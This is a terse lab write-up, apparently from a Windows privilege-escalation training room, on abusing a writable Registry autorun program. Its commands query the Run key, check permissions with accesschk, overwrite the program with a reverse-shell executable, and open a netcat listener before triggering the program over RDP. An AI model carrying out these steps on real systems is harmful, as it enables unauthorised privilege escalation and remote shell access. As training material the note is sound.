2x1 Registry - Autorun - RDP Needed to trigger


## Registry - Autorun

![163c1dafc6063ee877cbd1947d9a6386.png](../_resources/bd04a65c02664e2aae9d8d4905f763a1.png)

```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
![750fe5e8302aeb9a0e3747f495df090a.png](../_resources/b5323201be8f488d936a6fcbe465a734.png)

```bash
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```
![92e3b57672712ae2dc3fa6a9e5d32b44.png](../_resources/2b9eea0b9eba45cb992f861026f0debd.png)

```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```
![9c469b14c86f4b7602b313ab1d84aece.png](../_resources/2e326ae466a5461bb49c3f2d05f45f6c.png)

```
sudo nc -nvlp 53
rdesktop 10.10.126.225
```
![a0b2c6d671191e7f4a37af29332389c8.png](../_resources/9c35d77f666145d59f940d019892f210.png)